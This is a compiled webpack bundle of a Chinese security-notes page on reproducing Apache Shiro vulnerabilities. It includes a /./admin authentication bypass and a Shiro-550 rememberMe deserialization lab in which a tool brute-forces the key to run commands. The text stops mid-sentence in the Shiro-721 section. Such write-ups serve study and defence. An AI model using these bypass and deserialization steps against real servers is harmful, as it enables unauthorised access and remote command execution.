"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2146],{3905:(e,t,a)=>{a.d(t,{Zo:()=>u,kt:()=>g});var i=a(7294);function n(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function l(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,i)}return a}function r(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?l(Object(a),!0).forEach((function(t){n(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):l(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function o(e,t){if(null==e)return{};var a,i,n=function(e,t){if(null==e)return{};var a,i,n={},l=Object.keys(e);for(i=0;i<l.length;i++)a=l[i],t.indexOf(a)>=0||(n[a]=e[a]);return n}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(i=0;i<l.length;i++)a=l[i],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(n[a]=e[a])}return n}var d=i.createContext({}),c=function(e){var t=i.useContext(d),a=t;return e&&(a="function"==typeof e?e(t):r(r({},t),e)),a},u=function(e){var t=c(e.components);return i.createElement(d.Provider,{value:t},e.children)},p="mdxType",s={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},h=i.forwardRef((function(e,t){var a=e.components,n=e.mdxType,l=e.originalType,d=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),p=c(a),h=n,g=p["".concat(d,".").concat(h)]||p[h]||s[h]||l;return a?i.createElement(g,r(r({ref:t},u),{},{components:a})):i.createElement(g,r({ref:t},u))}));function g(e,t){var a=arguments,n=t&&t.mdxType;if("string"==typeof e||n){var l=a.length,r=new Array(l);r[0]=h;var o={};for(var d in t)hasOwnProperty.call(t,d)&&(o[d]=t[d]);o.originalType=e,o[p]="string"==typeof e?e:n,r[1]=o;for(var c=2;c<l;c++)r[c]=a[c];return i.createElement.apply(null,r)}return i.createElement.apply(null,a)}h.displayName="MDXCreateElement"},4825:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>d,contentTitle:()=>r,default:()=>s,frontMatter:()=>l,metadata:()=>o,toc:()=>c});var i=a(7462),n=(a(7294),a(3905));const l={},r=void 0,o={unversionedId:"\u6f0f\u6d1e\u590d\u73b0/shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0/shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0",title:"shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0",description:"\u4e00\u6587\u8bfb\u61c2\u9762\u8bd5\u5b98\u90fd\u5728\u95ee\u7684Shiro\u6f0f\u6d1e - YikJiang - \u535a\u5ba2\u56ed",source:"@site/docs/\u6f0f\u6d1e\u590d\u73b0/shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0.md",sourceDirName:"\u6f0f\u6d1e\u590d\u73b0",slug:"/\u6f0f\u6d1e\u590d\u73b0/shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0",draft:!1,editUrl:"https://github.com/Adm8n/Adm8n.github.io/tree/gh-pages/docs/\u6f0f\u6d1e\u590d\u73b0/shiro \u5386\u53f2\u7248\u672c\u6f0f\u6d1e\u590d\u73b0.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"log4j2\u6f0f\u6d1e\u590d\u73b02",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/log4j2\u6f0f\u6d1e\u590d\u73b02"},next:{title:"\u6316\u77ffXMR\u5e01 \u7a0b\u5e8f\uff08\u75c5\u6bd2\uff09\u53d1\u73b0\u4e0e\u6e05\u9664",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/\u6316\u77ffXMR\u5e01 \u7a0b\u5e8f\uff08\u75c5\u6bd2\uff09\u53d1\u73b0\u4e0e\u6e05\u9664"}},d={},c=[{value:"Apache Shiro \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2010-3863\uff09",id:"apache-shiro-\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1ecve-2010-3863",level:2},{value:"Shiro-550\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2016-4437\uff09",id:"shiro-550\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1ecve-2016-4437",level:2},{value:"\u6f0f\u6d1e\u7b80\u4ecb",id:"\u6f0f\u6d1e\u7b80\u4ecb",level:2},{value:"\u6f0f\u6d1e\u539f\u7406",id:"\u6f0f\u6d1e\u539f\u7406",level:2},{value:"\u4e00\u3001Shiro\u7b80\u4ecb",id:"\u4e00shiro\u7b80\u4ecb",level:3},{value:"\u4e8c\u3001Shiro\u670d\u52a1\u5668\u8bc6\u522b\u8eab\u4efd\u52a0\u89e3\u5bc6\u5904\u7406\u7684\u6d41\u7a0b",id:"\u4e8cshiro\u670d\u52a1\u5668\u8bc6\u522b\u8eab\u4efd\u52a0\u89e3\u5bc6\u5904\u7406\u7684\u6d41\u7a0b",level:3},{value:"1\u3001\u52a0\u5bc6",id:"1\u52a0\u5bc6",level:4},{value:"2\u3001\u89e3\u5bc6",id:"2\u89e3\u5bc6",level:4},{value:"\u4e09\u3001Key",id:"\u4e09key",level:3},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0",level:3},{value:"Shiro-721\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2019-12422\uff09",id:"shiro-721\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1ecve-2019-12422",level:2},{value:"\u6f0f\u6d1e\u7b80\u4ecb",id:"\u6f0f\u6d1e\u7b80\u4ecb-1",level:3},{value:"0x01 \u9996\u5148\u8bb2\u4e00\u4e0b\u9762\u8bd5\u5b98\u7ecf\u5e38\u4f1a\u95ee\u5230\u7684\u4e00\u4e2a\u95ee\u9898",id:"0x01-\u9996\u5148\u8bb2\u4e00\u4e0b\u9762\u8bd5\u5b98\u7ecf\u5e38\u4f1a\u95ee\u5230\u7684\u4e00\u4e2a\u95ee\u9898",level:4},{value:"0x02 \u6f0f\u6d1e\u6307\u7eb9",id:"0x02-\u6f0f\u6d1e\u6307\u7eb9",level:4},{value:"0x03 \u6f0f\u6d1e\u4ecb\u7ecd",id:"0x03-\u6f0f\u6d1e\u4ecb\u7ecd",level:4},{value:"\u6f0f\u6d1e\u539f\u7406",id:"\u6f0f\u6d1e\u539f\u7406-1",level:3},{value:"\u653b\u51fb\u6d41\u7a0b",id:"\u653b\u51fb\u6d41\u7a0b",level:3},{value:"AES-128-CBC",id:"aes-128-cbc",level:3},{value:"Padding Oracle Attack\u539f\u7406",id:"padding-oracle-attack\u539f\u7406",level:3},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0-1",level:2},{value:"1\u3001\u62c9\u53d6\u73af\u5883",id:"1\u62c9\u53d6\u73af\u5883",level:3},{value:"2\u3001\u653b\u51fb\u73af\u8282",id:"2\u653b\u51fb\u73af\u8282",level:3},{value:"Shiro \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2020-1957\uff09",id:"shiro-\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1ecve-2020-1957",level:2},{value:"\u6f0f\u6d1e\u539f\u7406",id:"\u6f0f\u6d1e\u539f\u7406-2",level:3},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0-2",level:3},{value:"1\u3001\u6743\u9650\u914d\u7f6e",id:"1\u6743\u9650\u914d\u7f6e",level:4},{value:"2\u3001\u9ed8\u8ba4\u72b6\u6001",id:"2\u9ed8\u8ba4\u72b6\u6001",level:4},{value:"3\u3001\u7ed5\u8fc7POC",id:"3\u7ed5\u8fc7poc",level:4},{value:"Shiro \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 \uff08CVE-2020-13933\uff09",id:"shiro-\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7-cve-2020-13933",level:2},{value:"\u6f0f\u6d1e\u7b80\u4ecb",id:"\u6f0f\u6d1e\u7b80\u4ecb-2",level:3},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0-3",level:3},{value:"1\u3001\u5f00\u542f\u73af\u5883",id:"1\u5f00\u542f\u73af\u5883",level:4},{value:"2\u3001\u6b63\u5e38\u8bbf\u95ee\u654f\u611f\u754c\u9762",id:"2\u6b63\u5e38\u8bbf\u95ee\u654f\u611f\u754c\u9762",level:4},{value:"3\u3001\u901a\u8fc7%3b\u7ed5\u8fc7\uff0c\u4e0d\u89e6\u53d1\u8eab\u4efd\u9a8c\u8bc1\u5e76\u4e14\u7ed5\u8fc7\u6743\u9650",id:"3\u901a\u8fc73b\u7ed5\u8fc7\u4e0d\u89e6\u53d1\u8eab\u4efd\u9a8c\u8bc1\u5e76\u4e14\u7ed5\u8fc7\u6743\u9650",level:4},{value:"Shiro \u6388\u6743\u7ed5\u8fc7 \uff08CVE-2022-32532\uff09",id:"shiro-\u6388\u6743\u7ed5\u8fc7-cve-2022-32532",level:2},{value:"\u6f0f\u6d1e\u7b80\u4ecb",id:"\u6f0f\u6d1e\u7b80\u4ecb-3",level:3},{value:"\u6f0f\u6d1e\u6982\u8ff0",id:"\u6f0f\u6d1e\u6982\u8ff0",level:3},{value:"\u5f71\u54cd\u8303\u56f4",id:"\u5f71\u54cd\u8303\u56f4",level:3},{value:"\u5229\u7528\u6d41\u7a0b",id:"\u5229\u7528\u6d41\u7a0b",level:3}],u={toc:c},p="wrapper";function s(e){let{components:t,...a}=e;return(0,n.kt)(p,(0,i.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,n.kt)("p",null,(0,n.kt)("a",{parentName:"p",href:"https://www.cnblogs.com/YikJiang/p/17457353.html#0x01%20%E9%A6%96%E5%85%88%E8%AE%B2%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E5%AE%98%E7%BB%8F%E5%B8%B8%E4%BC%9A%E9%97%AE%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"},"\u4e00\u6587\u8bfb\u61c2\u9762\u8bd5\u5b98\u90fd\u5728\u95ee\u7684Shiro\u6f0f\u6d1e - YikJiang - \u535a\u5ba2\u56ed")),(0,n.kt)("h2",{id:"apache-shiro-\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1ecve-2010-3863"},"Apache Shiro \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2010-3863\uff09"),(0,n.kt)("p",null,"\u6f0f\u6d1e\u8be6\u60c5\uff1a\nApache Shiro\u662f\u4e00\u6b3e\u5f00\u6e90\u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u5b66\u548c\u4f1a\u8bdd\u7ba1\u7406\u3002Shiro\u6846\u67b6\u76f4\u89c2\u3001\u6613\u7528\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u4f9b\u5065\u58ee\u7684\u5b89\u5168\u6027\u3002"),(0,n.kt)("p",null,"\u5728Apache Shiro 1.1.0\u4ee5\u524d\u7684\u7248\u672c\u4e2d\uff0cshiro \u8fdb\u884c\u6743\u9650\u9a8c\u8bc1\u524d\u672a\u5bf9url \u505a\u6807\u51c6\u5316\u5904\u7406\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020/\u3001//\u3001/./\u3001/\u2026/ \u7b49\u7ed5\u8fc7\u6743\u9650\u9a8c\u8bc1"),(0,n.kt)("p",null,"\u590d\u73b0\uff1a\n\u76f4\u63a5\u8bf7\u6c42\u7ba1\u7406\u9875\u9762/admin\uff0c\u65e0\u6cd5\u8bbf\u95ee\uff0c\u5c06\u4f1a\u88ab\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\u9762\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1689747149489-b0e217d0-2cb5-436a-b004-c927fe9b861a.png#averageHue=%23f5f4f4&clientId=u1ded2940-891e-4&from=paste&height=362&id=u179ea385&originHeight=398&originWidth=1269&originalType=binary&ratio=1.100000023841858&rotation=0&showTitle=false&size=53354&status=done&style=none&taskId=ua4efaf0d-94c9-468d-a033-916e60bb328&title=&width=1153.6363386319695",alt:"image.png"}),"\n\u6784\u9020\u6076\u610f\u8bf7\u6c42/./admin\uff0c\u5373\u53ef\u7ed5\u8fc7\u6743\u9650\u6821\u9a8c\uff0c\u8bbf\u95ee\u5230\u7ba1\u7406\u9875\u9762\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1689746826662-30cc7567-908d-4d3a-92c0-c4563593fa04.png#averageHue=%23f9f8f8&clientId=u1ded2940-891e-4&from=paste&height=649&id=ud5afd69a&originHeight=714&originWidth=1266&originalType=binary&ratio=1.100000023841858&rotation=0&showTitle=false&size=71895&status=done&style=none&taskId=u018bcd9a-f276-4b09-97b7-eb01eebd9b5&title=&width=1150.9090659638086",alt:"image.png"})),(0,n.kt)("h2",{id:"shiro-550\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1ecve-2016-4437"},"Shiro-550\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2016-4437\uff09"),(0,n.kt)("hr",null),(0,n.kt)("h2",{id:"\u6f0f\u6d1e\u7b80\u4ecb"},"\u6f0f\u6d1e\u7b80\u4ecb"),(0,n.kt)("p",null,"shiro-550\u4e3b\u8981\u662f\u7531shiro\u7684rememberMe\u5185\u5bb9\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u9020\u6210\u7684\u539f\u56e0\u662f\u9ed8\u8ba4\u52a0\u5bc6\u5bc6\u94a5\u662f\u786c\u7f16\u7801\u5728shiro\u6e90\u7801\u4e2d\uff0c\u4efb\u4f55\u6709\u6743\u8bbf\u95ee\u6e90\u4ee3\u7801\u7684\u4eba\u90fd\u53ef\u4ee5\u77e5\u9053\u9ed8\u8ba4\u52a0\u5bc6\u5bc6\u94a5\u3002\u4e8e\u662f\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\uff0c\u5bf9\u5176\u8fdb\u884c\u5e8f\u5217\u5316\u3001\u7f16\u7801\uff0c\u7136\u540e\u5c06\u5176\u4f5c\u4e3acookie\u7684rememberMe\u5b57\u6bb5\u5185\u5bb9\u53d1\u9001\uff0cShiro \u5c06\u5bf9\u5176\u89e3\u7801\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u8fd0\u884c\u4e00\u4e9b\u6076\u610f\u4ee3\u7801\u3002\n\u7279\u5f81\uff1acookie\u4e2d\u542b\u6709rememberMe\u5b57\u6bb5\n\u4fee\u590d\u5efa\u8bae\uff1a"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"\u66f4\u65b0shiro\u52301.2.4\u4ee5\u4e0a\u7684\u7248\u672c\u3002"),(0,n.kt)("li",{parentName:"ul"},"\u4e0d\u4f7f\u7528\u9ed8\u8ba4\u7684\u52a0\u5bc6\u5bc6\u94a5\uff0c\u6539\u4e3a\u968f\u673a\u751f\u6210\u5bc6\u94a5\u3002")),(0,n.kt)("h2",{id:"\u6f0f\u6d1e\u539f\u7406"},"\u6f0f\u6d1e\u539f\u7406"),(0,n.kt)("h3",{id:"\u4e00shiro\u7b80\u4ecb"},"\u4e00\u3001Shiro\u7b80\u4ecb"),(0,n.kt)("p",null,"Apache Shiro \u662f\u4e00\u4e2a\u5f3a\u5927\u6613\u7528\u7684 Java \u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u4e86\u8ba4\u8bc1\u3001\u6388\u6743\u3001\u52a0\u5bc6\u548c\u4f1a\u8bdd\u7ba1\u7406\u7b49\u529f\u80fd\uff0c\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0cShiro \u90fd\u53ef\u4ee5\u63d0\u4f9b\u5168\u9762\u7684\u5b89\u5168\u7ba1\u7406\u670d\u52a1\u3002\n\u5728Apache Shiro<=1.2.4\u7248\u672c\u4e2dAES\u52a0\u5bc6\u65f6\u91c7\u7528\u7684key\u662f",(0,n.kt)("strong",{parentName:"p"},"\u786c\u7f16\u7801"),"\u5728\u4ee3\u7801\u4e2d\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u9020RememberMe\u7684\u503c\uff0c\u7136\u540e\u8ba9\u5176\u53cd\u5e8f\u5217\u5316\u6267\u884c\u3002"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525189543-d6e679cb-db90-4bb4-ab55-3be7994028bf.png#averageHue=%23f2dfdd&clientId=u32eda4fe-00f4-4&from=paste&id=ub2af0c02&originHeight=330&originWidth=621&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u1db1ab79-f9eb-463b-90b2-31a4d151acc&title=",alt:null}),"\nPrimary Cocnerns\uff08\u57fa\u672c\u5173\u6ce8\u70b9\uff09:"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Authentication\uff08\u8ba4\u8bc1\uff09\uff1a\u7ecf\u5e38\u548c\u767b\u5f55\u6302\u94a9\uff0c\u662f\u8bc1\u660e\u7528\u6237\u8bf4\u4ed6\u4eec\u662f\u8c01\u7684\u4e00\u4e2a\u5de5\u4f5c"),(0,n.kt)("li",{parentName:"ul"},"Authorization\uff08\u6388\u6743\uff09\uff1a\u8bbf\u95ee\u63a7\u5236\u7684\u8fc7\u7a0b\uff0c\u5373\uff0c\u51b3\u5b9a\u2018\u8c01\u2019\u53ef\u4ee5\u8bbf\u95ee\u2018\u4ec0\u4e48"),(0,n.kt)("li",{parentName:"ul"},"Session Management\uff08\u4f1a\u8bdd\u7ba1\u7406\uff09\uff1a\u7ba1\u7406\u7528\u6237\u7279\u5b9a\u7684\u4f1a\u8bdd\uff0c\u5373\u4f7f\u5728\u975eweb\u6216\u662fEJB\u7684\u5e94\u7528\u4e2d"),(0,n.kt)("li",{parentName:"ul"},"Crytography\uff08\u52a0\u5bc6\uff09\uff1a\u901a\u8fc7\u52a0\u5bc6\u7b97\u6cd5\u4fdd\u8bc1\u6570\u636e\u7684\u5b89\u5168\uff0c\u4e14\u6613\u4e8e\u4f7f\u7528")),(0,n.kt)("p",null,"Supporting Features\uff08\u8f85\u52a9\u7279\u6027\uff09:"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Web Support\uff08\u7f51\u7edc\u652f\u6301\uff09:web support API\u53ef\u4ee5\u5e2e\u52a9\u5728web\u5e94\u7528\u4e2d\u65b9\u4fbf\u7684\u4f7f\u7528shiro"),(0,n.kt)("li",{parentName:"ul"},"Caching\uff08\u7f13\u5b58\uff09:\u4fdd\u8bc1\u5b89\u5168\u64cd\u4f5c\u4f7f\u7528\u5feb\u901f\u6709\u6548"),(0,n.kt)("li",{parentName:"ul"},"Concurrency\uff08\u5e76\u53d1\uff09:\u652f\u6301\u591a\u7ebf\u7a0b\u5e94\u7528"),(0,n.kt)("li",{parentName:"ul"},"Testing\uff08\u6d4b\u8bd5\uff09\uff1a\u652f\u6301\u96c6\u6210\u5355\u5143\u6d4b\u8bd5"),(0,n.kt)("li",{parentName:"ul"},"Run As\uff08\u4ee5..\u8fd0\u884c\uff09\uff1a\u53ef\u4ee5\u5047\u5b9a\u7528\u6237\u4e3a\u53e6\u4e00\u4e2a\u7528\u6237"),(0,n.kt)("li",{parentName:"ul"},"Remeber Me:\u8bb0\u4f4f\u7528\u6237\uff0c\u65e0\u9700\u518d\u6b21\u767b\u5f55")),(0,n.kt)("h3",{id:"\u4e8cshiro\u670d\u52a1\u5668\u8bc6\u522b\u8eab\u4efd\u52a0\u89e3\u5bc6\u5904\u7406\u7684\u6d41\u7a0b"},"\u4e8c\u3001Shiro\u670d\u52a1\u5668\u8bc6\u522b\u8eab\u4efd\u52a0\u89e3\u5bc6\u5904\u7406\u7684\u6d41\u7a0b"),(0,n.kt)("h4",{id:"1\u52a0\u5bc6"},"1\u3001\u52a0\u5bc6"),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},"\u7528\u6237\u4f7f\u7528\u8d26\u53f7\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\uff0c\u5e76\u52fe\u9009\u201dRemember Me\u201c\u3002"),(0,n.kt)("li",{parentName:"ol"},"Shiro\u9a8c\u8bc1\u7528\u6237\u767b\u5f55\u4fe1\u606f\uff0c\u901a\u8fc7\u540e\uff0c\u67e5\u770b\u7528\u6237\u662f\u5426\u52fe\u9009\u4e86\u201dRemember Me\u201c\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u82e5\u52fe\u9009\uff0c\u5219\u5c06\u7528\u6237\u8eab\u4efd\u5e8f\u5217\u5316\uff0c\u5e76\u5c06\u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9\u8fdb\u884cAES\u52a0\u5bc6\uff0c\u518d\u4f7f\u7528base64\u7f16\u7801\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u6700\u540e\u5c06\u5904\u7406\u597d\u7684\u5185\u5bb9\u653e\u4e8ecookie\u4e2d\u7684rememberMe\u5b57\u6bb5\u3002")),(0,n.kt)("h4",{id:"2\u89e3\u5bc6"},"2\u3001\u89e3\u5bc6"),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},"\u5f53\u670d\u52a1\u7aef\u6536\u5230\u6765\u81ea\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u7684\u8bf7\u6c42\u65f6\uff0c\u4f1a\u5728\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u4e2d\u7684cookie\u4e2d\u83b7\u53d6rememberMe\u5b57\u6bb5\u5185\u5bb9\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u5c06\u83b7\u53d6\u5230\u7684rememberMe\u5b57\u6bb5\u8fdb\u884cbase64\u89e3\u7801\uff0c\u518d\u4f7f\u7528AES\u89e3\u5bc6\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u6700\u540e\u5c06\u89e3\u5bc6\u7684\u5185\u5bb9\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u83b7\u53d6\u5230\u7528\u6237\u8eab\u4efd\u3002")),(0,n.kt)("h3",{id:"\u4e09key"},"\u4e09\u3001Key"),(0,n.kt)("p",null,"AES\u52a0\u5bc6\u7684\u5bc6\u94a5Key\u88ab\u786c\u7f16\u7801\u5728\u4ee3\u7801\u91cc"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u590d\u73b0"},"\u6f0f\u6d1e\u590d\u73b0"),(0,n.kt)("p",null,"\u653b\u51fb\u673aIP\uff1a192.168.0.109\n\u9776\u673aIP\uff1a192.168.72.128\n1\u3001\u8bbf\u95ee\u9776\u673a\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525189626-0e4009a1-5fed-4da9-b906-3dd82611b478.png#averageHue=%23f5f5f5&clientId=u32eda4fe-00f4-4&from=paste&id=u902f337a&originHeight=454&originWidth=833&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u1dacf6d8-13df-47fd-8440-aa3256d2c13&title=",alt:null}),"\n\u5b58\u5728Remember me\u9009\u9879\uff0c\u5c1d\u8bd5\u6293\u5305\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525189607-a45493d9-68e7-4ae4-b4ac-0e6be9ac9fec.png#averageHue=%23f9f8f8&clientId=u32eda4fe-00f4-4&from=paste&id=u3a2b9278&originHeight=427&originWidth=1425&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u24af5c45-c472-4d29-bc10-04fe33245ac&title=",alt:null}),"\n2\u3001\u6f0f\u6d1e\u5229\u7528\n",(0,n.kt)("a",{parentName:"p",href:"https://blog.csdn.net/Fighting_hawk/article/details/125562498"},"shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7efc\u5408\u5229\u7528\u5de5\u5177v2.2"),"\nGithub\u4e0a\u5de5\u5177\u5f88\u591a\uff0c\u6211\u4eec\u968f\u4fbf\u62ff\u4e00\u6b3e\u6765\u8fdb\u884c\u9a8c\u8bc1\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525189671-2dc4ef03-66da-4aaa-b3bb-526e563b2cf9.png#averageHue=%23ecebea&clientId=u32eda4fe-00f4-4&from=paste&id=uc83ca9bf&originHeight=451&originWidth=984&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=ue138ac5e-71e8-46f5-8039-15ddaca6565&title=",alt:null}),"\n\u7206\u7834\u5bc6\u94a5\u6210\u529f\u540e\uff0c\u5373\u53ef\u6267\u884c\u547d\u4ee4\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525189752-7350bc1a-48fc-497d-a286-a878ed20fac6.png#averageHue=%23eeeded&clientId=u32eda4fe-00f4-4&from=paste&id=ud130e2d4&originHeight=206&originWidth=660&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=ua0130d7e-e6ee-436f-aa68-9ccb4afa51f&title=",alt:null})),(0,n.kt)("h2",{id:"shiro-721\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1ecve-2019-12422"},"Shiro-721\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2019-12422\uff09"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u7b80\u4ecb-1"},"\u6f0f\u6d1e\u7b80\u4ecb"),(0,n.kt)("h4",{id:"0x01-\u9996\u5148\u8bb2\u4e00\u4e0b\u9762\u8bd5\u5b98\u7ecf\u5e38\u4f1a\u95ee\u5230\u7684\u4e00\u4e2a\u95ee\u9898"},"0x01 \u9996\u5148\u8bb2\u4e00\u4e0b\u9762\u8bd5\u5b98\u7ecf\u5e38\u4f1a\u95ee\u5230\u7684\u4e00\u4e2a\u95ee\u9898"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"Shiro550\u548cShiro721\u7684\u533a\u522b\u662f\u4ec0\u4e48")),(0,n.kt)("hr",null),(0,n.kt)("hr",null),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},"Shiro550\u53ea\u9700\u8981\u901a\u8fc7\u78b0\u649ekey\uff0c\u7206\u7834\u51fa\u6765\u5bc6\u94a5\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\n Shiro721\u7684ase\u52a0\u5bc6\u7684key\u4e00\u822c\u60c5\u51b5\u4e0b\u731c\u4e0d\u5230\uff0c\u662f\u7cfb\u7edf\u968f\u673a\u751f\u6210\u7684\uff0c\u5e76\u4e14\u5f53\u5b58\u5728\u6709\u6548\u7684\u7528\u6237\u4fe1\u606f\u65f6\u624d\u4f1a\u8fdb\u5165\u4e0b\u4e00\u9636\u6bb5\u7684\u6d41\u7a0b\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u7528\u767b\u5f55\u540e\u7684rememberMe Cookie\uff0c\u624d\u53ef\u4ee5\u8fdb\u884c\u4e0b\u4e00\u6b65\u653b\u51fb\n")),(0,n.kt)("h4",{id:"0x02-\u6f0f\u6d1e\u6307\u7eb9"},"0x02 \u6f0f\u6d1e\u6307\u7eb9"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"URL\u4e2d\u542b\u6709Shiro\u5b57\u6bb5"),(0,n.kt)("li",{parentName:"ul"},"cookie\u4e2d\u542b\u6709rememberMe\u5b57\u6bb5"),(0,n.kt)("li",{parentName:"ul"},"\u8fd4\u56de\u5305\u4e2d\u542b\u6709rememberMe")),(0,n.kt)("h4",{id:"0x03-\u6f0f\u6d1e\u4ecb\u7ecd"},"0x03 \u6f0f\u6d1e\u4ecb\u7ecd"),(0,n.kt)("p",null,"\u5728Shiro721\u4e2d\uff0cShiro\u901a\u8fc7AES-128-CBC\u5bf9cookie\u4e2d\u7684rememberMe\u5b57\u6bb5\u8fdb\u884c\u52a0\u5bc6\uff0c\u6240\u4ee5\u7528\u6237\u53ef\u4ee5\u901a\u8fc7Padding 